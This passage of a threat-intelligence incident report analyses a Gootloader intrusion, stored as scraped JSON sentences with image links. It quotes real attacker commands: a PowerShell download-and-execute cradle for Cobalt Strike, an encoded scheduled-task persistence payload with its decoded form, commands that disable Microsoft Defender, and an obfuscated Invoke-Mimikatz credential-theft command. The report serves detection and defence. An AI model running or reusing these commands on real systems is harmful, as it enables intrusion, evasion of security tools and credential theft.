                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6758 jetpack-lazy-image\" height=\"630\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png\" width=\"879\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6758\" height=\"630\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-07.png\" width=\"879\"/></a>"
                },
                {
                    "id": "<sentence_0xdc1dbad0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The below diagram summarizes the Gootloader initial execution.",
                    "html": "\nThe below diagram summarizes the Gootloader initial execution. \n \n"
                },
                {
                    "id": "<sentence_0x7bd16c72>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6759 jetpack-lazy-image\" height=\"766\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png\" width=\"1471\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6759\" height=\"766\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-08.png\" width=\"1471\"/></a>"
                },
                {
                    "id": "<sentence_0x413b074>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "An",
                    "html": "\nAn "
                },
                {
                    "id": "<sentence_0x72662025>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x5a95a21e>": "https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-javascript-or-vbscript-from-launching-downloaded-executable-content"
                    },
                    "text": "excellent",
                    "html": "<a class=\"ql-link\" href=\"https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-javascript-or-vbscript-from-launching-downloaded-executable-content\" rel=\"noopener noreferrer\" target=\"_blank\">excellent</a>"
                },
                {
                    "id": "<sentence_0xf3e26b9a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "resource from Microsoft describes a set of configurations that can be applied to Windows that can stop",
                    "html": " resource from Microsoft describes a set of configurations that can be applied to Windows that can stop "
                },
                {
                    "id": "<sentence_0x1f579258>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0xd61e63c3>": ".js"
                    },
                    "text": "",
                    "html": "<code>.js</code>"
                },
                {
                    "id": "<sentence_0x99558897>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "files from executing, preventing this attack chain from ever getting off the ground.<crlf><crlf>During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.<crlf><crlf>powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"",
                    "html": " files from executing, preventing this attack chain from ever getting off the ground.\n \nDuring later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n \npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))\"\n"
                }
            ]
        },
        {
            "id": "<chapter_0xd98e3e86>",
            "title": "Persistence",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xb9126311>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
                    "html": "\nThe Javascript (Gootloader) file invoked an encoded PowerShell command.\n \n"
                },
                {
                    "id": "<sentence_0x79b810e9>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6760 jetpack-lazy-image\" height=\"189\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png\" width=\"1815\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6760\" height=\"189\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-09.png\" width=\"1815\"/></a>"
                },
                {
                    "id": "<sentence_0x33de9689>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.<crlf><crlf>6876813;<crlf>$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";<crlf>$u=$env:USERNAME;<crlf>Register-ScheduledTask $u -In (New-ScheduledTask -Ac (New-ScheduledTaskAction -E ([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar (\"-w h -e \"+$a)) -Tr (New-ScheduledTaskTrigger -AtL -U $u));<crlf>30687851<crlf>Decoded PowerShell Payload:<crlf>6876813;<crlf>614649211;<crlf>$a = \"614649211\";<crlf>sleep - s 83;<crlf>$opj = Get - ItemProperty - path(\"hkcu:\\software\\microsoft\\Phone\\\"\"+[Environment]::(\" username \")+\" 0 \");<crlf>for ($uo = 0; $uo - le 760; $uo ++) {<crlf>Try {<crlf>$mpd += $opj.$uo<crlf>}<crlf>Catch {}<crlf>};<crlf>$uo = 0;<crlf>while ($true) {<crlf>$uo ++;<crlf>$ko = [math]::(\"sqrt\")($uo);<crlf>if ($ko - eq 1000) {<crlf>break<crlf>}<crlf>}<crlf>$yl = $mpd.replace(\"#\", $ko);<crlf>$kjb = [byte[]]::(\"new\")($yl.Length / 2);<crlf>for ($uo = 0; $uo - lt $yl.Length; $uo += 2) {<crlf>$kjb[$uo / 2] = [convert]::(\"ToByte\")($yl.Substring($uo, 2), (2 * 8))<crlf>}[reflection.assembly]::(\"Load\")($kjb);<crlf>[Open]::(\"Test\")();<crlf>611898544;<crlf>$u = $env : USERNAME;<crlf>Register - ScheduledTask $u - In(New - ScheduledTask - Ac(New - ScheduledTaskAction - E([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) - Ar(\"-w h -e \" + $a)) - Tr(New - ScheduledTaskTrigger - AtL - U $u));<crlf>306878516;<crlf>The task created from the PowerShell script:",
                    "html": "\n \nThe encoded PowerShell command creates a Scheduled Task that executes when the selected user logs on to the computer. An encoded PowerShell command is executed that will retrieve and execute the payload stored in the Registry.\n \n6876813;\n$a=\"NgAxADQANgA0ADkAMgAxADEAOwBzAGwAZQBlAHAAIAAtAHMAIAA4ADMAOwAkAG8AcABqAD0ARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACgAIgBoAGsAIgArACIAYwB1ADoAXABzAG8AZgAiACsAIgB0AHcAIgArACIAYQByAGUAXABtAGkAYwAiACsAIgByAG8AcwAiACsAIgBvAGYAdABcAFAAaABvAG4AZQBcACIAKwBbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgAoACIAdQBzAGUAIgArACIAcgBuACIAKwAiAGEAbQBlACIAKQArACIAMAAiACkAOwBmAG8AcgAgACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAZQAgADcANgAwADsAJAB1AG8AKwArACkAewBUAHIAeQB7ACQAbQBwAGQAKwA9ACQAbwBwAGoALgAkAHUAbwB9AEMAYQB0AGMAaAB7AH0AfQA7ACQAdQBvAD0AMAA7AHcAaABpAGwAZQAoACQAdAByAHUAZQApAHsAJAB1AG8AKwArADsAJABrAG8APQBbAG0AYQB0AGgAXQA6ADoAKAAiAHMAcQAiACsAIgByAHQAIgApACgAJAB1AG8AKQA7AGkAZgAoACQAawBvACAALQBlAHEAIAAxADAAMAAwACkAewBiAHIAZQBhAGsAfQB9ACQAeQBsAD0AJABtAHAAZAAuAHIAZQBwAGwAYQBjAGUAKAAiACMAIgAsACQAawBvACkAOwAkAGsAagBiAD0AWwBiAHkAdABlAFsAXQBdADoAOgAoACIAbgBlACIAKwAiAHcAIgApACgAJAB5AGwALgBMAGUAbgBnAHQAaAAvADIAKQA7AGYAbwByACgAJAB1AG8APQAwADsAJAB1AG8AIAAtAGwAdAAgACQAeQBsAC4ATABlAG4AZwB0AGgAOwAkAHUAbwArAD0AMgApAHsAJABrAGoAYgBbACQAdQBvAC8AMgBdAD0AWwBjAG8AbgB2AGUAcgB0AF0AOgA6ACgAIgBUAG8AQgAiACsAIgB5AHQAZQAiACkAKAAkAHkAbAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJAB1AG8ALAAyACkALAAoADIAKgA4ACkAKQB9AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvACIAKwAiAGEAZAAiACkAKAAkAGsAagBiACkAOwBbAE8AcABlAG4AXQA6ADoAKAAiAFQAZQAiACsAIgBzAHQAIgApACgAKQA7ADYAMQAxADgAOQA4ADUANAA0ADsA\";\n$u=$env:USERNAME;\nRegister-ScheduledTask $u -In (New-ScheduledTask -Ac (New-ScheduledTaskAction -E ([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) -Ar (\"-w h -e \"+$a)) -Tr (New-ScheduledTaskTrigger -AtL -U $u));\n30687851\nDecoded PowerShell Payload:\n6876813;\n614649211;\n$a = \"614649211\";\nsleep - s 83;\n$opj = Get - ItemProperty - path(\"hkcu:\\software\\microsoft\\Phone\\\"\"+[Environment]::(\" username \")+\" 0 \");\n for ($uo = 0; $uo - le 760; $uo ++) {\n Try {\n $mpd += $opj.$uo\n }\n Catch {}\n};\n$uo = 0;\nwhile ($true) {\n $uo ++;\n $ko = [math]::(\"sqrt\")($uo);\n if ($ko - eq 1000) {\n break\n }\n}\n$yl = $mpd.replace(\"#\", $ko);\n$kjb = [byte[]]::(\"new\")($yl.Length / 2);\nfor ($uo = 0; $uo - lt $yl.Length; $uo += 2) {\n $kjb[$uo / 2] = [convert]::(\"ToByte\")($yl.Substring($uo, 2), (2 * 8))\n}[reflection.assembly]::(\"Load\")($kjb);\n[Open]::(\"Test\")();\n611898544;\n$u = $env : USERNAME;\nRegister - ScheduledTask $u - In(New - ScheduledTask - Ac(New - ScheduledTaskAction - E([Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) - Ar(\"-w h -e \" + $a)) - Tr(New - ScheduledTaskTrigger - AtL - U $u));\n306878516;\nThe task created from the PowerShell script:\n \n"
                },
                {
                    "id": "<sentence_0x2a60f8fe>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6761 jetpack-lazy-image\" height=\"826\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png\" width=\"856\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6761\" height=\"826\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-10.png\" width=\"856\"/></a>"
                }
            ]
        },
        {
            "id": "<chapter_0x23d44360>",
            "title": "Defense Evasion",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x2cb2c16>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Windows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.",
                    "html": "\nWindows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.\n \n"
                },
                {
                    "id": "<sentence_0x666a83b9>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6762 jetpack-lazy-image\" height=\"442\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png\" width=\"1050\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6762\" height=\"442\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-11.png\" width=\"1050\"/></a>"
                },
                {
                    "id": "<sentence_0x92c90d6b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f<crlf>schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f<crlf>schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f<crlf>schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f<crlf>Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.<crlf><crlf>Set-MpPreference -DisableRealtimeMonitoring $true<crlf>Set-MpPreference -DisableArchiveScanning $true<crlf>Set-MpPreference -DisableBehaviorMonitoring $true<crlf>Set-MpPreference -DisableIOAVProtection $true<crlf>Set-MpPreference -DisableIntrusionPreventionSystem $true<crlf>Set-MpPreference -DisableScanningNetworkFiles $true<crlf>Set-MpPreference -MAPSReporting 0<crlf>Set-MpPreference -DisableCatchupFullScan $True<crlf>Set-MpPreference -DisableCatchupQuickScan $True<crlf>As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
                    "html": "\n \nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nFurthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n \nSet-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableArchiveScanning $true\nSet-MpPreference -DisableBehaviorMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableIntrusionPreventionSystem $true\nSet-MpPreference -DisableScanningNetworkFiles $true\nSet-MpPreference -MAPSReporting 0\nSet-MpPreference -DisableCatchupFullScan $True\nSet-MpPreference -DisableCatchupQuickScan $True\nAs in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.\n \n"
                },
                {
                    "id": "<sentence_0x788111bb>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6763 jetpack-lazy-image\" height=\"186\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png\" width=\"544\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6763\" height=\"186\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-12.png\" width=\"544\"/></a>"
                },
                {
                    "id": "<sentence_0xbdfbb34b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "This can be observed in the memory dump from the beachhead host with the tell-tale",
                    "html": "\n \nThis can be observed in the memory dump from the beachhead host with the tell-tale "
                },
                {
                    "id": "<sentence_0x19410087>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x13f5413>": "PAGE_EXECUTE_READWRITE"
                    },
                    "text": "",
                    "html": "<code>PAGE_EXECUTE_READWRITE</code>"
                },
                {
                    "id": "<sentence_0xbce6adcf>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "protection settings on the memory space and MZ headers observable in the process memory space.",
                    "html": " protection settings on the memory space and MZ headers observable in the process memory space.\n \n"
                },
                {
                    "id": "<sentence_0x7aa08f70>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6764 jetpack-lazy-image\" height=\"1360\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png\" width=\"1031\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6764\" height=\"1360\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-13.png\" width=\"1031\"/></a>"
                },
                {
                    "id": "<sentence_0xc56d0ac9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "During the intrusion we observed various named pipes utilized by the threat actors Cobalt Strike beacons including default Cobalt Strike named pipes.",
                    "html": "\n \nDuring the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.\n \n"
                },
                {
                    "id": "<sentence_0xa625e9cf>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6765 jetpack-lazy-image\" height=\"173\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png\" width=\"525\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6765\" height=\"173\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-14.png\" width=\"525\"/></a>"
                },
                {
                    "id": "<sentence_0x2f8713e8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "PipeName: \\msagent_ld<crlf>PipeName: \\1ea887<crlf>The threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.",
                    "html": "\n \nPipeName: \\msagent_ld\nPipeName: \\1ea887\nThe threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.\n \n"
                },
                {
                    "id": "<sentence_0xba3f7caa>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6766 jetpack-lazy-image\" height=\"585\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png\" width=\"2109\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6766\" height=\"585\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-15.png\" width=\"2109\"/></a>"
                },
                {
                    "id": "<sentence_0x8a4fc96b>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.",
                    "html": "\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.\n \n"
                },
                {
                    "id": "<sentence_0xf08537e6>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6767 jetpack-lazy-image\" height=\"1091\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png\" width=\"2331\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6767\" height=\"1091\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-16.png\" width=\"2331\"/></a>"
                },
                {
                    "id": "<sentence_0xf6c91065>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Decoding this script reveals that it is a publicly available",
                    "html": "\n \nDecoding this script reveals that it is a publicly available "
                },
                {
                    "id": "<sentence_0x8fb41d25>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xce7e38bc>": "https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1"
                    },
                    "text": "WMIExec script",
                    "html": "<a class=\"ql-link\" href=\"https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1\" rel=\"noopener noreferrer\" target=\"_blank\">WMIExec script </a>"
                },
                {
                    "id": "<sentence_0x4513ed72>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "for running remote WMI queries.",
                    "html": "for running remote WMI queries.\n \n"
                },
                {
                    "id": "<sentence_0x3d7edbf0>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6768 jetpack-lazy-image\" height=\"1214\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png\" width=\"1718\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6768\" height=\"1214\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-17.png\" width=\"1718\"/></a>"
                }
            ]
        },
        {
            "id": "<chapter_0x3afa4cce>",
            "title": "Credential Access",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xfd775ea9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The malicious PowerShell process used by Gootloader dropped a PowerShell script named mi.ps1 on the file system.",
                    "html": "\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named \u201cmi.ps1\u201d on the file system.\n \n"
                },
                {
                    "id": "<sentence_0x797398c0>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6769 jetpack-lazy-image\" height=\"78\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png\" width=\"1688\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6769\" height=\"78\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-18.png\" width=\"1688\"/></a>"
                },
                {
                    "id": "<sentence_0x13e2997a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Another PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.",
                    "html": "\n \nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.\n \n"
                },
                {
                    "id": "<sentence_0xc37266aa>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<a href=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-6770 jetpack-lazy-image\" height=\"155\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png\" width=\"1598\"/><img alt=\"\" class=\"aligncenter size-full wp-image-6770\" height=\"155\" src=\"https://thedfirreport.com/wp-content/uploads/2022/05/11462-19.png\" width=\"1598\"/></a>"
                },
                {
                    "id": "<sentence_0xcdfda0b0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "powershell -nop -noni -ep bypass -w h -c \"\"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name)('NWYsOV90Zjxec3t0cmUxX3RlP0Z0c1J9eHR/ZTgqNWQsNWY/OTk5OTVmOD9BYl5ze3RyZT9cdGV5fnViOG0uajlYZXR8MUdwY3hwc310K044P0dwfWR0P19wfHQ8cn14enQ2VTt2Nmw4P19wfHQ4P1h/Z356dDk2eWVlYSs+PiAjJj8hPyE/ICskJiYhIj42OCo3OVVYQzFQfXhwYis+WDtJODk1ZDgqMVh8YX5jZTxcfnVkfXQxUitNRGJ0Y2JNaGRieXA/fH5ifXRoTVh/Z356dDxGXFhUaXRyP2FiICoxWH9nfnp0PEZcWFRpdHIxPEVwY3Z0ZTFCWVBDVCAxPFV+fHB4fzFhY354f2JkY3B/cnQ/fX5ycH0xPERidGN/cHx0MVh/YmVwfX10YzE8WXBieTF0IyF0KSByJHIhJ3JydyMpKSUmJXIkKSB3ICIlIyJzKDE8Un58fHB/dTEzYX5mdGNieXR9fT90aXQxX3RmPFhldHxBY35hdGNlaDE8QXBleTE2WVpdXCtNQmhiZXR8TVJkY2N0f2VSfn9lY359QnRlTVJ+f2Vjfn1NXWJwNjE8X3B8dDE2VXhicHN9dEN0YmVjeHJldHVQdXx4fzYxPEdwfWR0MSExPEFjfmF0Y2VoRWhhdDFVRl5DVTMxPGd0Y3N+YnQ=')|%{$_-bxor17}|%{[char]$_})-join''))\"\"",
                    "html": "\npowershell -nop -noni -ep bypass -w h -c \"\"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name)('NWYsOV90Zjxec3t0cmUxX3RlP0Z0c1J9eHR/ZTgqNWQsNWY/OTk5OTVmOD9BYl5ze3RyZT9cdGV5fnViOG0uajlYZXR8MUdwY3hwc310K044P0dwfWR0P19wfHQ8cn14enQ2VTt2Nmw4P19wfHQ4P1h/Z356dDk2eWVlYSs+PiAjJj8hPyE/ICskJiYhIj42OCo3OVVYQzFQfXhwYis+WDtJODk1ZDgqMVh8YX5jZTxcfnVkfXQxUitNRGJ0Y2JNaGRieXA/fH5ifXRoTVh/Z356dDxGXFhUaXRyP2FiICoxWH9nfnp0PEZcWFRpdHIxPEVwY3Z0ZTFCWVBDVCAxPFV+fHB4fzFhY354f2JkY3B/cnQ/fX5ycH0xPERidGN/cHx0MVh/YmVwfX10YzE8WXBieTF0IyF0KSByJHIhJ3JydyMpKSUmJXIkKSB3ICIlIyJzKDE8Un58fHB/dTEzYX5mdGNieXR9fT90aXQxX3RmPFhldHxBY35hdGNlaDE8QXBleTE2WVpdXCtNQmhiZXR8TVJkY2N0f2VSfn9lY359QnRlTVJ+f2Vjfn1NXWJwNjE8X3B8dDE2VXhicHN9dEN0YmVjeHJldHVQdXx4fzYxPEdwfWR0MSExPEFjfmF0Y2VoRWhhdDFVRl5DVTMxPGd0Y3N+YnQ=')|%{$_-bxor17}|%{[char]$_})-join''))\"\"\n"
                },
                {
                    "id": "<sentence_0x30a113ed>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x48be8898>": "https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story"
                    },
                    "text": "This",
                    "html": "<a href=\"https://github.com/The-DFIR-Report/cyberchef-recipes/blob/main/SEO%20Poisoning%20-%20A%20GootLoader%20Story\" rel=\"noopener\" target=\"_blank\">This</a>"
                },
                {
                    "id": "<sentence_0xf5b27cf3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "CyberChef recipe can be used to decode the inner encoded command.<crlf><crlf>The output lists Invoke-Mimikatz, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.<crlf><crlf>$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted><crlf>Monitoring PowerShell event id 4103 we can observe the threat actors successful credential access activity from the Mimikatz invocation.",
